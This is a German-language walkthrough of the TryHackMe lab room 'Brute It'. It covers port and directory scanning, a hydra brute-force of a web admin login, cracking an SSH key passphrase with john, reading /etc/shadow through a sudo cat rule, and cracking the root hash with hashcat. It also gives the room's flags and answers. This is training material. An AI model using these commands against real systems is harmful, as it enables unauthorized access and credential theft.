# Brute It

*[Image: Image]*

In diesem Writeup geht es um den Raum Brute It auf [TryHackMe](https://tryhackme.com/room/lle) von [ReddyyZ](https://tryhackme.com/p/ReddyyZ).

Ziel des Raums ist es, etwas über brute-forcing, hash cracking und privilege escalation zu lernen.

## Verwendete Techniken
````
- nmap
- gobuster
- hydra
- ssh2john
- john
- hashcat
````

## Task 2: Reconnaissance

Um die Fragen zu beantworten nutze ich folgende Befehle:

````
❯ nmap -A -p- 10.10.201.149
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 11:42 CET
Nmap scan report for 10.10.201.149
Host is up (0.037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.70 seconds
````
Hier gibt es direkt auf die ersten vier Fragen eine Antwort.
Für die fünfte Frage, ist ein directory-scan mit dirb, dirbuster oder gobuster nötig.
Ich habe gobuster gewählt und lasse über folgenden Befehl scannen:

````
❯ gobuster dir -u 10.10.201.149 -w /usr/share/wordlists/dirb/common.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.201.149
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/23 11:57:38 Starting gobuster
===============================================================
/admin (Status: 301)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/11/23 11:57:45 Finished
===============================================================
````

Question 1: Search for open ports using nmap. How many ports are open?

Answer: 2

Question 2: What version of SSH is running?

Answer: OpenSSH 7.6p1

Question 3: What version of Apache is running?

Answer: 2.4.29

Question 4: Which Linux distribution is running?

Answer: Ubuntu

Question 5: Search for hidden directories on web server. What is the hidden directory?

Answer: /admin

## Task 3: Getting a shell

Um eine SSH-Verbindung zu bekommen, macht es (gerade in einem Raum, der Brute It heißt) Sinn, einen Brute-Force-Angriff laufen zu lassen.
Da das versteckte Verzeichnis auf dem Webserver /admin heißt, nutze ich hier admin als Username.
Der Hinweis im Source-Code bestätigt meine Vermutung:

*[Image: Image]*

Die richtige Syntax für den hydra Befehl ziehe ich mir aus der Netzwerkanalyse meines Browsers:

*[Image: Image]*

````
❯ hydra -l admin -P ~/rockyou.txt 10.10.201.149 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-23 12:53:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.201.149:80/admin/:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: 10.10.201.149   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-23 12:53:48
````

Wenn ich an CTFs arbeite, bei welchen ich einen Usernamen habe, lasse ich eigentlich immer, quasi nebenher, ein Terminal mit hydra gegen SSH und/oder FTP laufen, um nach einer funktionierenden Kombination aus Username und Passwort zu suchen.
Als wordlist nutze ich hier meistens rockyou.txt, da diese seit einer gefühlten Ewigkeit mit Kali-Linux mitgeliefert wird und bei CTFs eigentlich der Standard gilt: Wenn du es mit rockyou nicht innerhalb von 5 Minuten cracken kannst, ist es nicht dafür gedacht gebruteforced zu werden.

Frage 1 und 4 sind somit beantwortet. Im Adminpanel kann man einen RSA-Key herunterladen, welchen man dann mit ssh2john und john cracken kann.

````~/tools/john/run/ssh2john.py RSA_key > hash.txt````

````john --wordlist=../../rockyou.txt hash.txt````

Somit haben wir auch das Passwort für den User john. id_rsa muss noch private Berechtigungen erhalten, damit sie verwendet werden kann: ````chmod 600 id_rsa```` und los geht's über SSH.

````ssh john@10.10.201.149 -i id_rsa````

Und schon liegt die Antwort auf die letzte Frage dieses Tasks direkt vor meinen Füßen:

````
❯ ssh john@10.10.201.149 -i id_rsa
The authenticity of host '10.10.201.149 (10.10.201.149)' can't be established.
ECDSA key fingerprint is SHA256:6/bVnMDQ46C+aRgroR5KUwqKM6J9jAfSYFMQIOKckug.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.201.149' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Nov 23 12:34:58 UTC 2020

  System load:  0.0                Processes:           104
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 21%                IP address for eth0: 10.10.201.149
  Swap usage:   0%

63 packages can be updated.
0 updates are security updates.

Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ ll
total 40
drwxr-xr-x 5 john john 4096 Sep 30 14:11 ./
drwxr-xr-x 4 root root 4096 Aug 28 14:47 ../
-rw------- 1 john john  394 Sep 30 14:11 .bash_history
-rw-r--r-- 1 john john  220 Aug 16 18:14 .bash_logout
-rw-r--r-- 1 john john 3771 Aug 16 18:14 .bashrc
drwx------ 2 john john 4096 Aug 16 20:25 .cache/
drwx------ 3 john john 4096 Aug 16 20:25 .gnupg/
-rw-r--r-- 1 john john  807 Aug 16 18:14 .profile
drwx------ 2 john john 4096 Aug 16 20:25 .ssh/
-rw-r--r-- 1 john john    0 Aug 16 19:04 .sudo_as_admin_successful
-rw-r--r-- 1 root root   33 Aug 16 18:56 user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
````

Question 1: What is the user:password of the admin panel?

Answer: admin:xavier

Question 2: Crack the RSA key you found. What is John's RSA Private Key passphrase?

Answer: rockinroll

Question 3: user.txt

Answer: THM{a_password_is_not_a_barrier}

Question 4: Web flag

Answer: THM{brut3_f0rce_is_e4sy}

## Task 4: Privilege Escalation

Da grade in der Auflistung zu sehen war, dass es eine .sudo_as_admin_successful-Datei im home-dir von john gibt, wird er etwas als root ausführen können.
Die Vermutung überprüfe ich mit ````sudo -l````

````
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
````

Dann ist der Rest ja ein Kinderspiel! In /etc/shadow finde ich das Hash vom Root-Passwort, welches ich mit Hashcat cracke:

````
hashcat -a 0 -m 1800 '$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' ~/rockyou.txt
<Schnipp>
$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:football
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ...XEVgL.
Time.Started.....: Mon Nov 23 13:57:16 2020 (3 secs)
Time.Estimated...: Mon Nov 23 13:57:19 2020 (0 secs)
Guess.Base.......: File (/home/shendayan/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5803 H/s (11.12ms) @ Accel:128 Loops:16 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 20480/14344385 (0.14%)
Rejected.........: 0/20480 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: 123456 -> michelle4
Hardware.Mon.#1..: Temp: 57c Util:100% Core:1721MHz Mem:3504MHz Bus:8

Started: Mon Nov 23 13:56:55 2020
Stopped: Mon Nov 23 13:57:21 2020
````
Die root.txt kann man dann auf die selbe Art auslesen, wie /etc/shadow:
````sudo cat /root/root.txt````
Oder man wechselt eben zu root mit ````su root````, das Passwort hat Hashcat ja schon verraten :)

Question 1: Find a form to escalate your privileges. What is the root's password? 

Answer: football

Question 2: root.txt

Answer: THM{pr1v1l3g3_3sc4l4t10n}

Ich hoffe mit diesem Walkthrough war es kein Problem mehr, diesen Raum zu bewältigen.

Danke für’s Lesen und happy pwning!

Kontakt -> [Twitter](https://twitter.com/_the_someone)
